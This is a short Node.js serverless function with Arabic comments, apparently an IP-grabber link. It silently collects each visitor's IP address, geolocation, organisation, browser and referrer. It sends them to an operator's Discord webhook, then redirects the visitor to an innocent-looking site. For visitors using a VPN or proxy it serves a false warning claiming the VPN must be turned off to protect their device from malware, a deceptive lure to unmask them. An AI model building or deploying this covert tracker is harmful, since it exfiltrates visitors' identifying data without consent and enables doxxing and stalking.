const https = require('https');

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/..."  // ضع رابطك هنا
const REDIRECT_URL = "https://example.com";  // الموقع النهائي

module.exports = async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'unknown';
  const referrer = req.headers['referer'] || 'unknown';

  const geoUrl = `https://ipapi.co/${ip}/json/`;

  let country = "Unknown", country_code = "", city = "", region = "", org = "", is_vpn = false;

  try {
    const geoData = await fetch(geoUrl).then(r => r.json());
    country = geoData.country_name || "Unknown";
    country_code = (geoData.country_code || "").toLowerCase();
    city = geoData.city || "";
    region = geoData.region || "";
    org = geoData.org || "";
    is_vpn = geoData.proxy || geoData.vpn || false;
  } catch (e) {}

  const embed = {
    title: "📥 زائر جديد",
    color: 3447003,
    thumbnail: country_code ? { url: `https://flagcdn.com/w80/${country_code}.png` } : undefined,
    fields: [
      { name: "🌍 الدولة", value: `${country}, ${city} (${region})`, inline: true },
      { name: "🔌 المنظمة", value: org || "غير معروفة", inline: true },
      { name: "🌐 IP", value: ip, inline: false },
      { name: "🖥️ المتصفح", value: userAgent, inline: false },
      { name: "🔗 المصدر", value: referrer || "غير معروف", inline: false },
      { name: "🛡️ VPN/Proxy", value: is_vpn ? "نعم" : "لا", inline: true },
    ]
  };

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (e) {}

  if (is_vpn) {
    res.setHeader('Content-Type', 'text/html');
    res.status(200).end(`
      <html lang="ar" dir="rtl">
        <head><meta charset="utf-8"><title>تحذير</title></head>
        <body style="background:#111;color:#f44;text-align:center;padding:40px;font-family:sans-serif">
          <h1>⚠️ تم الكشف عن VPN / Proxy</h1>
          <p>يرجى تعطيل VPN لحماية جهازك من الفيروسات والبرمجيات الخبيثة.</p>
        </body>
      </html>
    `);
  } else {
    res.writeHead(302, { Location: REDIRECT_URL });
    res.end();
  }
};
